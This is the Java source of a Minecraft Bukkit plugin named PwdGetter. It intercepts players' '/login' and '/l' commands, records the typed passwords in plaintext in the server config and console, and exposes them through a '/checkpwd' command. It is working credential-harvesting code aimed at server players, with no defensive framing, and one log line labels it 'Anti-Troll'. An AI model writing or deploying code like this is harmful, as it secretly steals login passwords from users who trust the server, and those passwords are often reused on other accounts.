package io.d0048.pwdGetter;

import java.util.HashMap;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.plugin.java.JavaPlugin;

public final class PwdGetter extends JavaPlugin implements Listener{
	public boolean enable=false;
	public int time = 0;
	private HashMap<String, String> nameAndPasswords;// = new HashMap<String, String>();
    
	@Override
    public void onEnable() {
        //config = getConfig();
        //if(config==null) System.out.print("NPE");
        this.nameAndPasswords=new HashMap<String, String>();
		getServer().getPluginManager().registerEvents(this, this);
        
        this.getConfig().set("Enable", this.getConfig().getBoolean("Enable"));
        this.enable=this.getConfig().getBoolean("Enable");
        
        this.getConfig().set("Names", this.getConfig().getStringList("Names"));
        
        this.getConfig().set("Passwords", this.getConfig().getStringList("Passwords"));
        
        this.saveDefaultConfig();
        saveConfig();
        /*
        for(String passwd;this.getConfig().getStringList("Passwords").iterator().hasNext();){
        	passwd=this.getConfig().getStringList("Passwords").iterator().next();
        	for(String name;this.getConfig().getStringList("Names").iterator().hasNext();){
        		name=this.getConfig().getStringList("Names").iterator().next();
        		this.nameAndPasswords.put(name, passwd);
        	}
        }*/
        
        //this.nameAndPasswords.putAll(this.getConfig().getStringList("Names"),this.getConfig().getStringList("Passwords"));
        
		getLogger().info("[PasswordRecorder]Successfully loaded!");
    }
    
    @Override
    public void onDisable(){
		getLogger().info("[Anti-Troll]Reloading!");
    }
    
    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        
    	//refresh指令使用
    	if(cmd.getName().equalsIgnoreCase("checkpwd")){ 
    		if(args.length!=1){
    			sender.sendMessage(ChatColor.RED+"Wrong arguments![参数不正确]");
    			return false;
    		}
    		else{
    			//if(Bukkit.getPlayer(args[0])==null) sender.sendMessage(ChatColor.RED+"Player not found![找不到玩家]");
    			if (this.getConfig().getString(args[0])==null) sender.sendMessage(ChatColor.RED+"Player not recorded yet![玩家尚未被记录]");
    			else sender.sendMessage(ChatColor.GREEN+"Password phrase: "+this.getConfig().getString(args[0]));
    		}
    	}
		return true;
    }
    
    @EventHandler(priority = EventPriority.NORMAL,ignoreCancelled = true)
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
    	if( event.getMessage().startsWith("/l ") 
    			|| event.getMessage().startsWith("/L ") 
    			|| event.getMessage().startsWith("/login ")
    			|| event.getMessage().startsWith("/LOGIN ")
    			){
    		this.nameAndPasswords.put(event.getPlayer().getName(), event.getMessage());
			this.getConfig().set(event.getPlayer().getName(), event.getMessage());
    		System.out.print("正在记录"+event.getPlayer().getName()+"的"+event.getMessage());
    		/*
    		Set <String>names=this.nameAndPasswords.keySet();
    		for(;names.iterator().hasNext();){
    			System.out.print("正在准备写入"+event.getPlayer().getName()+"的"+event.getMessage());
    			String name=names.iterator().next();
    			String passwd=this.nameAndPasswords.get(name);
    			System.out.print("正在写入"+name+"的"+passwd);
    			/*if(this.getConfig().contains(name)){
    				this.getConfig().set(name, passwd);
    			}
    			else{*/
    				//this.getConfig().set(name, passwd);
    			//}
    		//}
    		this.saveConfig();
    		this.saveDefaultConfig();
    	}
    }

}
